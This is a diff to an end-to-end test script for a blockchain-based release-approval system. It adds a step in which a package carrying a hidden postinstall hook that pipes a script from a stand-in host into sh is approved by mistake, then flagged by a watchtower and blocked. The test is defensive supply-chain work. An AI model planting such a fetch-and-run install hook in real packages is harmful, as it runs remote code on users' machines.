@@ -7,7 +7,8 @@
 //
 // Needs: the worker built (npm run build:worker). Testnet mode also needs .env from setup-testnet.mjs.
 
-import { existsSync } from 'node:fs';
+import { existsSync, mkdtempSync, writeFileSync } from 'node:fs';
+import { tmpdir } from 'node:os';
 import path from 'node:path';
 import { fileURLToPath } from 'node:url';
 import { NearChain } from '../src/chain.mjs';
@@ -140,8 +141,26 @@ try {
   check(!recalled.ok, `verify now fails: ${recalled.reason}`);
 
   if (local) {
+    step('8. Watchtower: a release with a hidden install script is flagged inside the window');
+    const evil = makePackage(name, '1.0.2', "module.exports = 'v3';\n", { scripts: { postinstall: 'curl https://evil.test/i.sh | sh' } });
+    const file = path.join(mkdtempSync(path.join(tmpdir(), 'keyturn-')), 'evil.tgz');
+    writeFileSync(file, evil);
+    const previous = path.join(path.dirname(file), 'v1.tgz');
+    writeFileSync(previous, v1.tarball);
+    await chain.ci.call('propose_release', { project_id: project, version: '1.0.2', artifact_hash: sha256(evil) });
+    await cmd.approve(chain.ada, { project, version: '1.0.2' });
+    await cmd.approve(chain.bob, { project, version: '1.0.2' });
+    check((await statusOf('1.0.2')) === 'Pending', 'both maintainers approved by mistake: the public window is open');
+    const w = await cmd.watch(chain.watch, { project, version: '1.0.2', tarball: file, previous, flag: true, bond: '0.1' });
+    say(w.text.split('\n').join('\n   '));
+    check(w.flagged && (await statusOf('1.0.2')) === 'Flagged', 'Watchtower flagged it with a bond');
+    net.advance(WINDOW_SECONDS * 1000 + 4000);
+    await expectRefused(cmd.execute(chain.watch, { project, version: '1.0.2' }), 'execution is blocked even after the window');
+  }
+
+  if (local) {
     // The wait is seven days, so this part only runs on the simulated clock.
-    step('8. Break-glass: guardians recover a project, a live member can veto');
+    step('9. Break-glass: guardians recover a project, a live member can veto');
     const g = { g1: net.as('g1.local'), g2: net.as('g2.local') };
     await cmd.proposeGuardians(chain.ada, { project, guardians: 'g1.local,g2.local,g3.local', threshold: 2 });
     await cmd.proposeGuardians(chain.bob, { project, guardians: 'g1.local,g2.local,g3.local', threshold: 2 });
